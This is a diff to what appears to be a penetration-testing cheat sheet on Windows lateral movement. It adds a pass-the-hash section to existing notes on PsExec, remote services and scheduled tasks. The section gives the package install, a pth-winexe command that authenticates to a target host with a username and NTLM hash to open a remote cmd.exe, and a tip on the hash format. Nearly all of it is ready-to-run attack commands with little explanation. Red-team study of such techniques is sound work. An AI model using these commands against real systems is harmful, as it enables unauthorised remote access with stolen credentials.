@@ -10,6 +10,9 @@
 * [3. Remotely Creating Services Using sc](#Remotely-Creating-Services-Using-SC)
 * [4. Creating Scheduled Tasks Remotely](#Creating-Scheduled-Tasks-Remotely)
 
+##### ➤ Windows - Pass the hash
+* [1. Passing the hash method](#Passing-the-hash-method)
+
 ``` ```
 ``` ```
 ## Psexec
@@ -99,3 +102,22 @@ schtasks /s TARGET /run /TN "MYTASK"
 ```
 schtasks /S TARGET /TN "MYTASK" /DELETE /F
 ```
+
+
+
+``` ```
+``` ```
+## Passing the hash method
+
+Install
+```
+sudo apt install passing-the-hash
+```
+
+Pass the hash
+```
+#From the kali linux machine
+pth-winexe -U 'admin%hash' //10.0.0.1 cmd.exe
+```
+
+**Note:** Remember the full hash includes both the LM and NTLM hash, separated by a colon
